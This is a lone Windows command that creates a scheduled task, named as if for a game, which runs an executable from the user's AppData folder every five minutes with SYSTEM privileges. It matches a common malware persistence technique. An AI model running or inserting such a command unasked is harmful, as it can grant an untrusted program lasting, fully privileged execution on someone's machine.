schtasks /create /tn "RunGameEvery5Minutes" /tr "%APPDATA%\overlay.exe" /sc minute /mo 5 /ru SYSTEM /f
